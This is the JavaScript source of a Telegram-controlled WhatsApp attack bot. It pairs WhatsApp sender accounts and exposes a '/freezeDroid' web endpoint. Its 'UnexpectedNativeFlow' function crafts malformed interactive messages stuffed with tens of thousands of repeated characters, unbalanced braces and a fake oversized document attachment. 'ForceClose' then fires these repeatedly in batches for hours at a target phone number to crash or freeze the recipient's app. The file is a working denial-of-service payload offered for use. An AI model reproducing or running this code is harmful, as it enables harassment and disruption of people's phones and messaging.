const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const sessions_dir = "./sessions";
const file_session = "./active.json";
const express = require('express');
const app = express();
const PORT = process.env.PORT || 31337;

const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateWAMessageContent,
    generateWAMessageFromContent,
    generateMessageID, 
    generateRandomMessageId,   
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    proto,
    BaileysError,
} = require('@whiskeysockets/baileys');

let Ren;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ren = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ren);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ren.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ren = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ren);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ren.requestPairingCode(BotNumber, "RENNBAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ren.ev.on("creds.update", saveCreds);
  return Ren;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});


console.clear();  
                  console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⡿⢿⡿⠿⠿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⣋⣭⣶⣶⣞⣿⣶⣶⣶⣬⣉⠻⣿⣿⡿⣋⣉⠻⣿⣿⣿
⣿⢻⣿⠃⣤⣤⣢⣍⣴⣿⢋⣵⣿⣿⣿⣿⣷⣶⣝⣿⣿⣧⣄⢉⣜⣥⣜⢷⢹⢇⢛
⡏⡦⡁⡸⢛⡴⢣⣾⢟⣿⣿⣿⢟⣾⣧⣙⢿⣿⣿⣿⣿⣿⣿⣿⢩⢳⣞⢿⡏⢷⣾
⣷⣵⡇⣗⡾⢁⣾⣟⣾⣿⡿⣻⣾⣿⣿⣿⡎⠛⡛⢿⣿⡟⣿⣿⡜⡜⢿⡌⠇⢾⣿
⣿⣿⠁⣾⠏⣾⣿⣿⣽⣑⣺⣥⣿⣿⣿⣿⣷⣶⣦⣖⢝⢿⣿⣿⣿⡀⠹⣿⣼⢸⣿
⣿⣿⢰⡏⢡⣿⣿⠐⣵⠿⠛⠛⣿⣿⣿⣿⣿⠍⠚⢙⠻⢦⣼⣿⣿⠁⣄⣿⣿⠘⣿
⣿⣿⢸⢹⢈⣿⣿⠘⣡⡞⠉⡀⢻⣿⣿⣿⣿⢃⠠⢈⢳⣌⣩⣿⣿⠰⠿⢼⣿⠀⣿
⣿⠿⣘⠯⠌⡟⣿⡟⣾⣇⢾⡵⣹⣟⣿⣿⣿⣮⣓⣫⣿⣟⢿⣿⢿⡾⡹⢆⣦⣤⢹
⣅⣛⠶⠽⣧⣋⠳⡓⢿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣫⣸⠏⡋⠷⣛⣫⡍⣶⣿
⣿⡿⢸⢳⣶⣶⠀⡇⣬⡛⠿⣿⣿⣿⣿⣿⣿⣿⠿⢟⣉⣕⡭⠀⢺⣸⣽⢻⡅⣿⣿
⣿⡇⣾⡾⣰⡯⠀⡗⣯⣿⣽⡶⠶⠂⢠⣾⣿⠐⠚⠻⢯⣿⠇⠎⡀⣳⣿⣼⡃⣿⣿
⣿⡇⣟⣇⡟⣧⠀⡗⣿⣿⡿⢡⢖⣀⠼⢟⣻⣤⣔⢦⢸⣿⢀⢆⢡⣿⣯⢹⡃⣿⣿
⣿⡇⡏⣿⡾⣸⣿⣇⠸⠟⣋⣼⣼⣿⢻⣿⣿⢿⣟⢾⣌⠫⠈⣶⣿⡿⣩⡿⢃⣿⣿
⣿⣷⡀⠻⡷⢪⢧⡙⠰⣾⣿⣿⣾⡽⣾⣿⡿⣺⣵⣾⣿⡇⡜⣽⠟⢷⣪⣴⣿⣿⣿
⣿⣿⣿⣾⣿⠏⣤⡁⣷⣽⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣱⠸⣱⣦⠙⣿⣿⣿⣾⣿`));

                  bot.launch();
                  console.log(chalk.green(`
──────☐ 定期的なボット ☐──────`));
console.log(chalk.red(`
╭─☐ BOT HASCLAW API 
├─ ID OWN : ${OwnerId}
├─ BOT : CONNECTED ✅
╰───────────────────`));
initializeWhatsAppConnections();


// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
  bot.command("connect", async (ctx) =>
              {
                  const args = ctx.message.text.split(" ");
                  if (args.length < 2) {
                  return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
                   }

                   const BotNumber = args[1];
                   await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
                   await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
    
  bot.command("listsender", (ctx) =>
              {
                  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
                  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
                  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

  bot.command("delsender", async (ctx) =>
              {
                  const args = ctx.message.text.split(" ");
                  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

                  const number = args[1];
                  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

                  try {
                  const sessionDir = sessionPath(number);
                  sessions.get(number).end(); 
                  sessions.delete(number);
                  fs.rmSync(sessionDir, { recursive: true, force: true });

                  const data = JSON.parse(fs.readFileSync(file_session));
                  const updated = data.filter(n => n !== number);
                  fs.writeFileSync(file_session, JSON.stringify(updated));

                  ctx.reply(`Sender ${number} berhasil dihapus.`);
                  } catch (err) {
                  console.error(err);
 
                  }
                  });
                  
                  
//bug funcation 
async function UnexpectedNativeFlow(target, mention = true) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        message: {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "🧬⃟⃨〫⃰—‣ ⁖⟆͙  𝐂͢𝚺𝚵͢ 𝚻͢𝚬𝚨M ⟅̊༑ ‣—"  + "ꦽ".repeat(30000),
                  format: "DEFAULT"
                },
                footer: {
                  text: "© CSX-Team 2025"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000),
                  buttons: []
                }
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url:
                      "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?" +
                      "ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                    fileLength: "9999999999999",
                    pageCount: 3567587327,
                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                    fileName: " ༑ The CSX - ( 🐼 ) ༑",
                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                    directPath:
                      "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?" +
                      "ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1735456100",
                    contactVcard: true,
                    caption: "©CSX-Team 2025 #ExplanationOldTypeMsg"
                  }
                }
              }
            }
          }
        }
      }),
      { userJid: target }
    );

    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await Ren.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷"
              },
              content: undefined
            }
          ]
        }
      );
    }

    console.log(chalk.green("─────「 ⏤WeForRen ! 」─────"));
  } catch (err) {
    console.error(chalk.red("UnexpectedNativeFlow Error:"), err);
  }
}

async function ForceClose(durationHours, X) {
              const totalDurationMs = durationHours * 60 * 60 * 1000;
                const startTime = Date.now();
                let count = 0;
                let batch = 1;
                const maxBatches = 5;

              const sendNext = async () => {
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
                return;
                }

              try {
                if (count < 5) {
                await Promise.all([
                UnexpectedNativeFlow(X)
              ]);
                console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/5 Andros 📟
└────────────────────────┘
  `));
                count++;
                setTimeout(sendNext, 700);
              } else {
                console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
              if (batch < maxBatches) {
                console.log(chalk.yellow(`( Grade Matrix 🍂 777 ).`));
                count = 0;
                batch++;
                setTimeout(sendNext, 5 * 60 * 1000);
              } else {
                console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
              }
              }
              } catch (error) {
              console.error(`❌ Error saat mengirim: ${error.message}`);
              setTimeout(sendNext, 700);
                    }
              };
              sendNext();
              }
              
              
// Appp Get root Server \\
app.get("/freezeDroid", async (req, res) => {
  const targetNumber = req.query.target;
  const target = `${targetNumber}@s.whatsapp.net`;
  
  if (sessions.size === 0) {
    console.log(chalk.red("❌ Tidak ada sender aktif."));
    return res.status(503).json({ error: "Sender belum aktif" });
  }

  try {
    await ForceClose(24, target);
    res.json({ status: "sent", target });
    console.log(chalk.green(`✅ Berhasil kirim ke ${target}`));
  } catch (err) {
    console.error(chalk.red("❌ Gagal kirim pesan:"), err);
    res.status(500).json({ error: "Gagal kirim pesan" });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});